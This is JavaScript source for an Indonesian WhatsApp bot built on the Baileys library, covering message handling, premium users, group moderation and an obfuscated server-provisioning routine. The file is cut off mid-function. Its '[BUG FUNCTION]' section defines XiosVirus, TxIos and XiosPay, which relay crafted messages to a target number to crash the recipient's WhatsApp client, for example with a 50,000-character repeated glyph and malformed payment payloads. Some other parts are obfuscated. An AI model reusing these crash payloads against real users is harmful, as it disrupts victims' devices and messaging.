/*

#kiuu base
github : https://github.com/kiuur
youtube : https://youtube.com/@kyuurzy
rest api : https://shinoa.us.kg

#pengembang Kyami Silence
youtube : https://youtube.com/@SlncKyami

HAPUS WM INI DOSA BESAR LU NJIR 
TAMBAHIN NAMALU AJA KALO LU NGEMBANGIN
NIH SC

[ ! ] JANGAN DIJUAL KECUALI LU KEMBANGIN SCNYA
*/
require('../setting/config');

const jsobfus = require('javascript-obfuscator')
const os = require('os')
const speed = require('performance-now')
const fs = require('fs');
const crypto = require('crypto')
const axios = require('axios');
const chalk = require("chalk");
const ytdl = require("@distube/ytdl-core")
const util = require("util");
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');

//FUNCTION LIB
const uploadFile = require('./lib/uploadFile')
const uploadImage = require('./lib/uploadImage')
const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredPremiumCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./lib/premiun')

const { default: baileys, proto, generateWAMessage, generateWAMessageContent, generateWAMessageFromContent, getContentType, prepareWAMessageMedia, downloadContentFromMessage } = require("@whiskeysockets/baileys");

module.exports = kyami = async (kyami, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? kyami.user.id.split(":")[0] + "@s.whatsapp.net" || kyami.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const owner = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));
const botNumber = await kyami.decodeJid(kyami.user.id);
const Access = [botNumber, ...owner, ...global.owner];
const isCmd = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
const number = m.sender.replace(/@.+/g, '')
    
//ROLE/DATA
let premium = JSON.parse(fs.readFileSync('./start/lib/database/premium.json'))
const Creator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPremium= Creator || checkPremiumUser(m.sender, premium)
        expiredPremiumCheck(kyami, m, premium)
let totalreg = Object.values(global.db.data.users).filter(user => user.registered == true).length  
    
// Group function
const groupMetadata = isGroup ? await kyami.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Database
const contacts = JSON.parse(fs.readFileSync("./start/lib/database/contacts.json"))
try{
const isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? 1000 : 0
let user = global.db.data.users[sender]
if (typeof user !== 'object') global.db.data.users[sender] = {}
if (user) {
if (!('registered' in user)) user.registered = false
if (!('nick' in user)) user.nick = m.sender
if (!('age' in user)) user.age = 0
if (!('sn' in user)) user.sn = 0
if (!isNumber(user.limit)) user.limit = limitUser
if (!isPremium) user.premium = false
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('lastclaim' in user)) user.lastclaim = new Date * 1
if (!isNumber(user.regTime)) user.regTime = -1
if (!('resellerpanel' in user)) user.resellerpanel = false
} else global.db.data.users[sender] = {
registered: false,
nick: m.sender,
age: 0,
sn: 0,
limit: limitUser,
premium: `${isPremium ? 'true' : 'false'}`,
afkTime: -1,
lastclaim: new Date * 1,
regTime: -1,
resellerpanel: false
}
    
let chats = global.db.data.chats[m?.chat]
if (typeof chats !== 'object') global.db.data.chats[m?.chat] = {}
if (chats) {
if (!('luminai' in chats)) chats.luminai = false
if (!('welcome' in chats)) chats.welcome = false
if (!('antilinkgc' in chats)) chats.antilinkgc = false
if (!('antivirtex' in chats)) chats.antivirtex = false
 if (!('resellerpanelgrup' in chats)) chats.resellerpanelgrup = false
}
else global.db.data.chats[m.chat] = {
luminai: false,
welcome: false,
antilinkgc: false,
antivirtex: false,
resellerpanelgrup: false
}
    
let settings = global.db.data.settings[botNumber]
            if (typeof settings !== 'object') global.db.data.settings[botNumber] = {}
            if (settings) {
if (!('autobio' in settings)) settings.autobio = false
if (!('autoread' in settings)) settings.autoread = false
} else global.db.data.settings[botNumber] = {
autobio: false,
autoread: false
   } 
} catch (e) {
console.log(e)
}
 
    
var chats = global.db.data.chats[m.chat],
users = global.db.data.users[m.sender],
settings = global.db.data.settings[botNumber],
limitnya = global.db.data.users[m.sender].limit,
reseller = global.db.data.users[m.sender].resellerpanel,
groupseller = global.db.data.chats[m.chat].resellerpanelgrup

//GAME
if(!('hadiah' in db.data.settings)) db.data.settings.hadiah = []
if(!('hadiahkadaluwarsa' in db.data.settings)) db.data.settings.hadiahkadaluwarsa = []
// Function
const { clockString, smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep, formatp, getRandom } = require('./lib/myfunction');
const { ytdl } = require('./lib/scrape/scrape-ytdl');
// Time
const date = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time = moment.tz("Asia/Makassar").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜"
} else {
ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜"
};
    
// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
`   ⌬ Pesan: ${m.body || m.mtype} \n` +
`   ⌬ Pengirim: ${m.pushname} \n` +
`   ⌬ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Grup: ${groupName} \n` +
`   ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}

// Helper functions
const replyy = (anu) => {
const {message, key} = generateWAMessageFromContent(m.chat, {
interactiveMessage: {
body: {text: anu},
footer: {text: `${global.footer}`},
nativeFlowMessage: {
buttons: [{text: "CREATOR : KYAMI SILENCE"}
],
}
},
}, {quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `${body}`}}})
kyami.relayMessage(m.chat, {viewOnceMessage:{message}}, {messageId:key.id})
}
const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *${prefix + command}* ${teks}\n`
}

const reaction = async (jidss, emoji) => {
kyami.sendMessage(jidss, { react: { text: emoji, key: m.key }})}
 
//REPLY
async function replymenu(txt) {
kyami.sendMessage(m.chat, {
      image: fs.readFileSync('./start/data/video/thumb.jpg'),
      gifPlayback: true,
      caption: txt,
      contextInfo: {
      externalAdReply: {
      title: namabot,
      body: ownername,
      thumbnailUrl: 'https://img100.pixhost.to/images/710/540584608_agstore.jpg',
      sourceUrl: 'https://youtube.com/@Slnckyami',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
                    
function _0x2746(){const _0x59e161=['522672zPDjJo','74202KbUlJz','60205iLXssa','https://www.youtube.com/@slnckyami','18LlJZRk','8562aXnmlO','72flAsXt','idsaluran','17297028qqNYtA','2108904VLUOMy','CLICK\x20TO\x20GET\x20THIS\x20SCRIPT','chat','4089400PKWBkF'];_0x2746=function(){return _0x59e161;};return _0x2746();}function _0x1134(_0x34bebb,_0x49fe0b){const _0x2746b4=_0x2746();return _0x1134=function(_0x113469,_0x418f2d){_0x113469=_0x113469-0x1d6;let _0x3d8965=_0x2746b4[_0x113469];return _0x3d8965;},_0x1134(_0x34bebb,_0x49fe0b);}(function(_0xb271b1,_0x2216bc){const _0x5e168b=_0x1134,_0x47f14d=_0xb271b1();while(!![]){try{const _0xc9fc6=-parseInt(_0x5e168b(0x1d6))/0x1+parseInt(_0x5e168b(0x1da))/0x2*(parseInt(_0x5e168b(0x1db))/0x3)+-parseInt(_0x5e168b(0x1dc))/0x4*(parseInt(_0x5e168b(0x1d8))/0x5)+-parseInt(_0x5e168b(0x1d7))/0x6+-parseInt(_0x5e168b(0x1e2))/0x7+-parseInt(_0x5e168b(0x1df))/0x8+parseInt(_0x5e168b(0x1de))/0x9;if(_0xc9fc6===_0x2216bc)break;else _0x47f14d['push'](_0x47f14d['shift']());}catch(_0x5e5742){_0x47f14d['push'](_0x47f14d['shift']());}}}(_0x2746,0x54f54));async function reply(_0x30c9c2){const _0x1d6bbb=_0x1134,_0x3a4881={'contextInfo':{'forwardingScore':0x3e7,'isForwarded':!![],'forwardedNewsletterMessageInfo':{'newsletterName':namasaluran,'newsletterJid':''+global[_0x1d6bbb(0x1dd)]},'externalAdReply':{'showAdAttribution':!![],'title':''+namabot,'body':_0x1d6bbb(0x1e0),'thumbnailUrl':''+thumbnail,'sourceUrl':_0x1d6bbb(0x1d9)}},'text':_0x30c9c2};return kyami['sendMessage'](m[_0x1d6bbb(0x1e1)],_0x3a4881,{'quoted':m});}
//FAKE QUOTED
const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot Pushkontak By Kyami Silence - Official`,jpegThumbnail: ""}}}
const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
}, message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": "",
},
"title": `Pterodactyl Server By ${ownername}`,
"description": null,
"currencyCode": "IDR",
"priceAmount1000": "9999999999",
"retailerId": `Powered By kyami`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}}
}

const qsticker = {
key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `footer`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "IDR", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "NIH STICKERMU!!!"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "INR"}}}}

const qpayment = {
key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `footer`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "IDR", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Kyami Silence Nih Boss"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "INR"}}}}

const kyamidsaluran = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363303311249930@newsletter`,
newsletterName: `𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜`,
jpegThumbnail: "",
caption: `𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜`,
inviteExpiration: Date.now() + 1814400000
}
}
}
//ASYNC
function generateRandomPassword(p) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const length = p;
  let password = 'kyami';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}
//LIMIT
async function uselimit(r) {
 users.limit -= r
 replyy(`*YOUR LIMIT HAS USE ${r}*\n\n\`LIMITMU SISA ${users.limit}\``)
}
//AI
async function luminai(content, prompt, user) {
  function generateRandomUserId() {
    return 'user-' + Math.floor(Math.random() * 10000);
}
let userId = generateRandomUserId();
console.log(`Generated User ID: ${userId}`);
    try {
        const response = await axios.post('https://luminai.my.id/', { content, prompt, user });
        return response.data;
    } catch (error) {
        console.error(error);
        throw error;
    }
}   
//OBFUS
async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${namabot}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}
//TOTAL FITUR
const totalFitur = () =>{
            var mytext = fs.readFileSync("./start/kyami.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
}
//AFK
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	     for (let jid of mentionUser) {
            let user = db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            reply(`Please Don't Tag Him\nHe's AFK ${reason ? 'With reason ' + reason : 'no reason'}\nAfk Since ${clockString(new Date - afkTime)}`.trim())
        }
        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            reply(`You Have Returned From AFK\nAFK Reason: ${user.afkReason ? user.afkReason : ''}\nAFK Duration: ${clockString(new Date - user.afkTime)}`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
  // Auto Read
		if (db.data.settings[botNumber].autoread) {
            kyami.readMessages([m.key]);
        }
 //AUTOBIO
if (global.db.data.settings[botNumber].autobio) {
kyami.updateProfileStatus(`Ryou Yamada Have Been Running For ${runtime(process.uptime())}`).catch(_ => _)
}
//antivirtex by Alwaysaqiooo 
  if (chats.antivirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return reply(mess.botadmin)
  await kyami.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
kyami.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
kyami.sendMessage(m.chat, {text:`\`\`\`「 Virus Terdeteksi 」\`\`\`\n\n${pushname} Telah ditendang karena mengirim virus di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//ANTILINK GROUP NO KICK
if (chats.antilinkgc) {
            if (budy.match(`chat.whatsapp.com`)) {
               bvl = `\`\`\`GC Link Detected\`\`\`\n\nAdmin has sent a gc link, admin is free to send any link`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (Creator) return reply(bvl)
               await kyami.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			kyami.sendMessage(from, {text:`\`\`\`GC Link Detected\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
}
//[BUG FUNCTION]
    async function XiosVirus(jid) {
			kyami.relayMessage(jid, {
				'extendedTextMessage': {
					'text': '.',
					'contextInfo': {
						'stanzaId': jid,
						'participant': jid,
						'quotedMessage': {
							'conversation': '⭑̤⟅̊༑ ▾ ⋆✩⋆ 𝖪ꮢꂦ𝘤Ø 𝗩7 ⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': jid
				}
			}, {
				'messageId': null
			});
			console.log(chalk.red("Succes Send Bug ©Kyami Silence 🥶"));
    };
async function TxIos(X, Ptcp = false) {
			await kyami.relayMessage(X, {
					"extendedTextMessage": {
						"text": "⭑̤⟅̊༑ ▾ ⋆✩⋆ 𝖪ꮢꂦ𝘤Ø 𝗩7 ⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "6283199373983@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "6283199373983@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": X,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "6283199373983@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "A̺͆N̺͆T̺͆I̺͆ G̺͆E̺͆D̺͆O̺͆R̺͆〽",
								"body": "KYAMI SILENCE ",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://www.instagram.com/WhatsApp",
								"mediaUrl": "https://www.instagram.com/WhatsApp",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://www.instagram.com/WhatsApp"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6283199373983-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6283199373983-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_kyami_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.red("Succes Send Bug ©Kyami Silence🥶"));
		};
    async function XiosPay(jid) {
			kyami.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
			console.log(chalk.red("Succes Send Bug © Kyami Silence🥶"));
		};
//CPANEL
function _0x20f7(){const _0x416b7a=['log','location','ghcr.io/parkervcp/yolks:nodejs_18','\x20MB\x0aCPU:\x20','application/json','stringify','4108852MtJfbl','-Bykyami@gmail.com','445278dRQybl','yah\x20gagal\x20om...\x0a_silakan\x20cek\x20api\x20plta\x20dan\x20pltc\x20anda_','539CpMYOK','Bearer\x20','disk','\x0a⎙─➤\x20*🌐LOGIN*\x20:\x20','attributes','/api/application/users','split','Unlimited','\x0a*SUCCESSFULLY\x20ADD\x20USER\x20+\x20SERVER*\x0aTYPE:\x20user\x0aID:\x20','\x0aNAME:\x20','eggsnya','\x0a>\x20Tanggal\x20','POST','npm','npm\x20start','json','limits','readFileSync','mentionedJid','onWhatsApp','GET','quoted','Hai\x20@','212578TRdurU','@s.whatsapp.net','/api/application/servers','131802WBoUvt','errors','%\x0a\x0a','\x0a\x0a⎙─➤\x20*👤USERNAME*\x20:\x20','93170hyaEnl','146752dnGvJU','125UlEJbf','memory','./start/data/image/thumb.jpg','669171RvjUEg','sendMessage','username','startup','cpu','2529ZLVBtW','sender'];_0x20f7=function(){return _0x416b7a;};return _0x20f7();}(function(_0x41de20,_0x15b719){const _0x45fdc8=_0x4405,_0x28a456=_0x41de20();while(!![]){try{const _0xdfc939=parseInt(_0x45fdc8(0x1d6))/0x1+-parseInt(_0x45fdc8(0x1ca))/0x2+parseInt(_0x45fdc8(0x1cd))/0x3+parseInt(_0x45fdc8(0x1af))/0x4+parseInt(_0x45fdc8(0x1d3))/0x5*(-parseInt(_0x45fdc8(0x1b1))/0x6)+parseInt(_0x45fdc8(0x1b3))/0x7*(-parseInt(_0x45fdc8(0x1d2))/0x8)+parseInt(_0x45fdc8(0x1db))/0x9*(parseInt(_0x45fdc8(0x1d1))/0xa);if(_0xdfc939===_0x15b719)break;else _0x28a456['push'](_0x28a456['shift']());}catch(_0x3815fc){_0x28a456['push'](_0x28a456['shift']());}}}(_0x20f7,0xf04e5));function _0x4405(_0x51283b,_0x3ee78d){const _0x20f79=_0x20f7();return _0x4405=function(_0x4405ad,_0x57f2da){_0x4405ad=_0x4405ad-0x1ac;let _0x46da73=_0x20f79[_0x4405ad];return _0x46da73;},_0x4405(_0x51283b,_0x3ee78d);}async function 